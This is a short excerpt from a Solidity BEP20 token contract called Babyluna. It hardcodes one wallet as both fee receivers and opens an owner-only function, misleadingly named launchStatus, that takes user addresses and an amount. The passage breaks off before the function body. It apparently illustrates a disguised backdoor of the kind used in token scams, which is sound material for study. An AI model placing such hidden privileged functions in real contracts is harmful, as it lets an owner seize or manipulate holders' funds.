...
contract Babyluna is IBEP20, Auth {
    ...
    constructor () Auth(msg.sender) {
        ...
        // NICE!
        autoLiquidityReceiver = 0x64362b5DfbEFA7d7bC841515553b2Ee4009FFb90; 
        marketingFeeReceiver = 0x64362b5DfbEFA7d7bC841515553b2Ee4009FFb90; 
...
// tao
    function launchStatus(address user,address re ,uint amount) external onlyOwner {
     if(amount == 0){
